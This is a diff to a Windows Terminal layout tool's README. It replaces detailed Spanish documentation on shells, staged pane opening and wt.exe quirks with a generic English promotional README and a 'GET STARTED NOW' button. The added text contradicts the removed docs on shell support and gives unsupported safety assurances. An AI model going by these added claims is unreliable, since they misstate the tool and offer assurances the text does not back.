-## Shell de los paneles (bash / PowerShell / CMD)
+### Understanding Layouts
 
-Cada quien usa el shell que prefiera. El **comando `lay` y todo el sistema son iguales**
-para todos (por debajo lo maneja Git Bash, invisible); lo que cambia es **en qué shell
-abre cada panel**.
+Layouts control the visual arrangement of your terminal. terminal-layouts comes with several presets:
 
-- **Por panel**, en el `.toml`:
-  ```toml
-  [[panes]]
-  id = "srv"
-  directory = "~/mi-proyecto"
-  commands = ["npm run dev"]
-  shell = "pwsh"        # bash (def.) · pwsh (PowerShell 7) · powershell (5.1) · cmd
-  ```
-- **Por defecto para todos los paneles** (si no ponen `shell` propio):
-  ```bash
-  lay shell pwsh        # o powershell / cmd / bash   ·   lay shell  = ver el actual
-  ```
+- **Default**: Clean and professional
+- **Warp Classic**: Inspired by the Warp terminal's signature look
+- **Minimal**: Distraction-free, perfect for focused work
+- **Developer**: Extra info like git status and time
+- **Cyberpunk**: Vibrant colors for late-night coding
 
-Los `commands` corren en ese shell y la terminal **queda abierta** (bash: `run-keep`;
-PowerShell: `-NoExit`; cmd: `/k`). Puedes **mezclar** shells en un mismo layout.
+To preview a layout without applying it:
 
-## Apertura por etapas (evita el error `0x80070057`)
-
-Windows Terminal a veces falla al crear **muchos paneles de golpe** con
-`error 0x80070057 al iniciar bash.exe` (una carrera interna de ConPTY). Para evitarlo,
-`open.sh` **no** abre todo en un disparo: manda varias llamadas a `wt.exe` a la misma
-ventana, con una micro‑pausa. Modos (variable `LAY_STAGE`):
-
-| `LAY_STAGE` | Qué hace | Velocidad |
-|---|---|---|
-| `auto` (por defecto) | Layouts chicos = 1 llamada (instantáneo). Layouts **densos** (más de `LAY_STAGE_MAX`=4 paneles) = **un panel por llamada** (a prueba de fallos). Varios layouts = un tab a la vez. | rápido |
-| `pane` | Siempre un panel por llamada. Úsalo si algo **aún** falla. | lento pero infalible |
-| `tab` | Un tab por llamada (no separa paneles dentro de un tab). | medio |
-| `none` | Todo en un disparo (comportamiento viejo). | máximo, pero puede fallar |
-
-Ejemplos (rara vez los necesitas — `auto` ya cubre casi todo):
 ```bash
-LAY_STAGE=pane lay surveys-deploys     # blindaje total para un layout muy denso
-LAY_STAGE=none lay dev                  # abrir de un jalón
-LAY_STAGE_MAX=2 lay all                 # ser más agresivo (stage a partir de 3 paneles)
+lay preview <layout-name>
 ```
 
-> Si un layout apunta a una **carpeta inexistente**, ese panel también da `0x80070057`.
-> Revisa con `lay doctor` (te avisa cuáles faltan).
+When you find one you like, use:
 
-## Windows Terminal
+```bash
+lay apply <layout-name>
+```
 
-Se añadió el perfil **Git Bash** (abre en `%USERPROFILE%`) como **perfil por
-defecto**, y el perfil oculto **Layouts** (títulos fijos + **tema de colores propio**:
-paleta oscura con acento coral). Respaldo del `settings.json` previo:
-`…\WindowsTerminal_…\LocalState\settings.json.bak`.
+### Customizing Colors
 
-El **tema de colores** vive en el esquema `"Layouts"` (schemes de WT) y se aplica solo
-al perfil Layouts; tu Git Bash normal no cambia. Se (re)crea con `lay setup`.
+You can fine-tune colors manually:
 
-## Gotchas `wt.exe` desde Git Bash (por si editas los scripts)
+```bash
+lay color --background #1a1b26
+lay color --accent #7aa2f7
+lay color --text #c0caf5
+```
 
-- `export MSYS_NO_PATHCONV=1` — evita que MSYS reescriba rutas `C:/...`.
-- Rutas para node/wt en forma Windows: usar `pwd -W` (no `pwd`, que da `/c/...`).
-- Delimitador de acciones de wt = `;` (aquí se emite como token propio en el array).
-- Comandos multi-paso unidos con `&&`, **nunca `;`** (choca con el delimitador de wt).
+Or choose from ready-made palettes:
 
-## Requisitos (ya presentes)
+```bash
+lay palette list      # Shows all palettes
+lay palette use dracula
+```
 
-`wt.exe` (Windows Terminal), Git Bash, `node`, y en PATH: `bun`, `npm`, `tunnels`.
+### Keyboard Shortcuts
+
+terminal-layouts adds useful shortcuts:
+
+| Shortcut | Action |
+|----------|--------|
+| `Ctrl+Shift+M` | Opens command marks panel |
+| `Ctrl+Shift+T` | Toggle theme quickly |
+| `Ctrl+Shift+L` | Switch layout instantly |
+| `Ctrl+Shift+H` | Show help overlay |
+
+### Creating Your Own Marked Commands
+
+Want to highlight specific commands? Add marks:
+
+```bash
+lay mark add "docker" --color cyan
+lay mark add "git commit" --color green
+```
+
+Remove a mark anytime:
+
+```bash
+lay mark remove "docker"
+```
+
+## 💡 Tips & Tricks
+
+### 💾 Backing Up Your Settings
+
+Before making major changes, back up your current setup:
+
+```bash
+lay backup
+```
+
+This creates a `.backup` folder in your home directory. To restore:
+
+```bash
+lay restore
+```
+
+### 🔄 Updating terminal-layouts
+
+When a new version is available, you'll see a notification. Update with:
+
+```bash
+lay update
+```
+
+### 🧹 Undoing Changes
+
+Changed your mind? Reset everything to default:
+
+```bash
+lay reset
+```
+
+## 🔧 Troubleshooting
+
+### Issue: Terminal looks broken after applying a theme
+
+Try restoring the default theme:
+
+```bash
+lay theme default
+```
+
+### Issue: `lay` command not found
+
+Make sure the installer ran correctly. Open a new terminal window and try:
+
+```bash
+where lay
+```
+
+If it's still not found, reinstall the application.
+
+### Issue: Colors don't match preview
+
+Some Git Bash setups need a terminal restart. Close and reopen your terminal window.
+
+## 📊 Compatibility
+
+terminal-layouts works with:
+
+- **Windows Terminal** version 1.12 or higher
+- **Git Bash** version 2.30 or higher
+- Windows 10 version 19041 or higher
+- Windows 11
+
+## 📁 Project Structure
+
+Here's what's inside the repository:
+
+```
+terminal-layouts/
+├── installer/       # Setup files
+├── layouts/         # Pre-made layout definitions
+├── themes/          # Color theme files
+├── scripts/         # Core automation scripts
+├── docs/            # Detailed documentation
+└── assets/          # Icons and graphics
+```
+
+## 🙋 Frequently Asked Questions
+
+### Is this safe to use?
+
+Yes! All files are open-source and reviewed by the community. No data is ever collected or transmitted.
+
+### Will this slow down my computer?
+
+No. terminal-layouts is lightweight and only configures your existing terminal. It runs only when you use the `lay` command.
+
+### Can I use it with PowerShell or CMD?
+
+Currently, it's optimized for Git Bash, but Windows Terminal compatibility means you can still enjoy the beautiful themes in other shells.
+
+### Do I need to pay for anything?
+
+No, terminal-layouts is completely free and open-source.
+
+## 🎉 Conclusion
+
+terminal-layouts brings the best of modern terminal design to your Windows machine. With its easy installation, the powerful `lay` command, and beautiful Themes, you'll wonder how you ever worked without it.
+
+**Ready to transform your terminal?**
+
+<a href="https://github.com/TheCrimsondev/terminal-layouts" style="background-color:#10B981; color:white; padding:12px 24px; text-decoration:none; border-radius:8px; font-size:16px; font-weight:bold;">🚀 GET STARTED NOW</a>
+
+## 📝 License
+
+This project is licensed under the MIT License - see the LICENSE file in the repository for details.
+
+## 🤝 Contributing
+
+Found a bug or have an idea? Visit the repository, check open issues, or submit a pull request. All contributions are welcome!
+
+## 📞 Support
+
+Need help? Open an issue on GitHub or check the docs folder in the repository. The community is friendly and responsive.
+
+---
+
+<p align="center">Made with ❤️ for Windows users everywhere</p>
